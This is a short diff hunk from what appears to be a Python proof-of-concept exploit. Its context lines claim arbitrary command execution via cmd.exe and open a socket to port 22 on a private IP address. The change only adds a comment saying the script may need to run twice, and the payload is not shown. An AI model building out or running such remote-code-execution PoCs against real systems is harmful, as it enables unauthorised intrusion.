@@ -34,6 +34,7 @@ import time
 # this PoC will open internet Explorer but any command can be executed in the context of cmd.exe
 
 # create Socket for transport 
+# you may need to run it twice to get the command to execute 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(('172.16.49.152',22))
 
